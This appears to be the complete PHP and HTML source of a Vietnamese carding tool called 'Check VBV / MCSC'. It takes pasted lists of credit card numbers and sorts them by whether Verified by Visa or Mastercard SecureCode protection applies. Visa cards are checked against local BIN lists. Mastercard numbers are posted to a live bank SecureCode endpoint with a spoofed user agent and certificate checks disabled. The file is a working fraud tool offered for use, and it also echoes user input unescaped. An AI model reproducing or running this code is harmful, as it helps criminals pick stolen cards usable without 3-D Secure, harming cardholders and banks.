<html>
<head><title>--[ Check VBV / MCSC - EmXinhTT.Net ]--</title>
<link rel="stylesheet" type="text/css" href="default1.css">
</head>
<body bgcolor="#F0FCE9">
<center><h1>--[ Check VBV / MCSC - EmXinhTT.Net ]--</h1>
<h3>Tool t&#7921; nh&#7853;n CCNUM &#273;&#7875; check !!!</h3>
</center>
<div align=center>
<form id="form1" name="form1" method="post" action="">
      <textarea name="cclist" cols="100" rows="10" id="cclist"><? echo $_POST["cclist"]; ?></textarea>
         <pre> <input type="submit" name="Submit" value="Click V&#224;o &#272;&#226;y " /></pre>
    </form>    
 <p><center>
 </div>
</body>
</html>
<?
function curl($url ="",$post=""){
	$ch = curl_init();
	curl_setopt ($ch, CURLOPT_URL, $url);   
	curl_setopt($ch, CURLOPT_POST ,1);
	curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
	curl_setopt ($ch, CURLOPT_USERAGENT, sprintf("Mozilla/%d.0",rand(4,5)));
	curl_setopt ($ch, CURLOPT_HEADER, 0);
	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
	$result = curl_exec($ch);
	curl_close($ch);
	return $result;
}

function inStr($s,$as){
	$s=strtoupper($s);
	if(!is_array($as)) $as=array($as);
	for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
	return false;
}

function get($ccn){
	$ccn=str_replace(Array(" ","-"),Array("",""),$ccn);
	$cctype=substr($ccn,0,1);
	if($cctype==4){
		return visa($ccn);
	}
	if($cctype==5){
		$u="https://tdsc.53.com/mcsc/login.do";
		$p="cardNumber=".$ccn."&submit=Submit";
		$s=@curl($u,$p);
		return @inStr($s,"MasterCard SecureCode is not available for this card")?3:2;
	}
	if($cctype!=4||$cctype!=5){
		 return 4;
	}
}

function visa($ccn){
	$file = file_get_contents('dbvbv/hv.txt');
	$bin=substr($ccn,0,6);
	if(stristr($file,$bin."\n")){
		return 0;
	}
	else{
		$file = file_get_contents('dbvbv/nv.txt');
		if(stristr($file,$bin."\n")){
			return 1;
		}
		else{
			return 5;
		}
	}
}

function ccnum($ccline){
  $xy = array("|","\\","/","-",";");
  $sepe = $xy[0];
  foreach($xy as $v){
	  if (substr_count($ccline,$sepe) < substr_count($ccline,$v)) $sepe = $v;
  }
  $x = explode($sepe,$ccline);
  foreach($xy as $y) $x = str_replace($y,"",str_replace(" ","",$x));
  foreach ($x as $xx){
	  $xx = trim($xx);
		 if (is_numeric($xx)){
			 $yy=strlen($xx);
			 switch ($yy){
				 case 15: $ccnum['num'] = $xx; break;
				 case 16: $ccnum['num'] = $xx; break;
			  }
		  }
  }
	return $ccnum['num'];
}

	
if(@$_POST["cclist"]){
	$cclist=split("\n",trim($_POST["cclist"]));
	echo("<center><font size=5 color=red>======== K&#7870;T QU&#7842; ========</font>");
	echo("<table width=92% border=0><tr align=left><td>");
	for($i=0;$i<count($cclist);$i++){
		$ccnum = ccnum($cclist[$i]);
		if($ccnum){
			$kq = get(trim($ccnum));
			switch($kq){ 
			case 0:	echo "<b><font color=green>Pass VBV =&gt; | </b></font>".$cclist[$i]."<br>"; 
					$vbv=$vbv.($i+1).".<font color=green>Pass VBV =&gt; | </font>".$cclist[$i]."<br>";
					break;
			case 1:	echo "<b><font color=red>No Pass VBV =&gt; |</b> </font>".$cclist[$i]."<br>"; 
					$novbv=$novbv.($i+1).".<font color=red>No Pass VBV =&gt; | </font>".$cclist[$i]."<br>";
					break;
			case 5:	echo "<b><font color=orange>Unknown <a target=_blank href='addvbv.php?ccn=$ccnum'>[ClickHere]</a> =&gt; | </b></font>".$cclist[$i]."<br>"; 
					$unk=$unk.($i+1).".<font color=orange>Unknown =&gt; | </font>".$cclist[$i]."<br>";
					break;
			case 2:	echo "<b><font color=red>No Pass MCSC =&gt; | </b></font>".$cclist[$i]."<br>"; 
					$nomcsc=$nomcsc.($i+1).".<font color=red>No Pass MCSC =&gt; | </font>".$cclist[$i]."<br>";
					break;
			case 3:	echo "<b><font color=green>Pass MCSC =&gt; |</b> </font>".$cclist[$i]."<br>"; 
					$mcsc=$mcsc.($i+1).".<font color=green>Pass MCSC =&gt; | </font>".$cclist[$i]."<br>";
					break;
			case 4:	echo "<b><font color=blue>Card kh&#244;ng h&#7907;p l&#7879; =&gt; |</b></font> ".$cclist[$i]."<br>"; 
					$invalid=$invalid.($i+1).".<font color=blue>Card kh&#244;ng h&#7907;p l&#7879; =&gt; |</font> ".$cclist[$i]."<br>";
					break;
			}
		}
	}

	echo("</td></tr></table>");
	if($vbv){
		echo("<h2><font color=green>Pass VBV</font></h2><br><table border=1 width=92%><tr><td border=1>".$vbv."</tr></td></table><br>");
	}
	if($novbv){
		echo("<h2><font color=green>No Pass VBV</font></h2><br><table border=1 width=92%><tr><td border=1>".$novbv."</tr></td></table><br>");
	}
	if($mcsc){
		echo("<h2><font color=green>Pass MCSC</font></h2><br><table border=1 width=92%><tr><td border=1>".$mcsc."</tr></td></table><br>");
	}
	if($nomcsc){
		echo("<h2><font color=green>No Pass MCSC</font></h2><br><table border=1 width=92%><tr><td border=1>".$nomcsc."</tr></td></table><br>");
	}
	if($unk){
		echo("<h2><font color=green>Ch&#432;a c&#243; trong data</font></h2><br><table border=1 width=92%><tr><td border=1>".$unk."</tr></td></table><br>");
	}
	if($invalid){
		echo("<h2><font color=green>Invalid CCNumber</font></h2><br><table border=1 width=92%><tr><td border=1>".$invalid."</tr></td></table><br>");
	}
	echo("</center>");
}
?>